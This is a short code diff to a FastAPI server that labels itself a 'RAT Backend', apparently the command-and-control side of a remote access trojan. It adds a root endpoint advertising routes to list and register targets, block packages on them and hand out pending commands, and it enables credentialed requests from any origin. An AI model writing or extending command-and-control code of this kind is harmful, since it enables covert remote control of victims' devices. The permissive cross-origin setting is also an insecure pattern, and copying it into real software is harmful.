@@ -8,6 +8,7 @@ app = FastAPI()
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
+    allow_credentials=True,
     allow_methods=["*"],
     allow_headers=["*"],
 )
@@ -30,7 +31,9 @@ CREATE TABLE IF NOT EXISTS commands (
     status TEXT DEFAULT 'pending'
 )
 """)
-
+@app.get("/")
+def root():
+    return {"message": "RAT Backend is RUNNING 🔥", "status": "active", "endpoints": ["/list_targets", "/register/{id}", "/block/{id}/{pkg}", "/get_commands/{id}"]}
 @app.get("/register/{target_id}")
 def register(target_id: str, nama: str = "Unknown"):
     conn.execute(
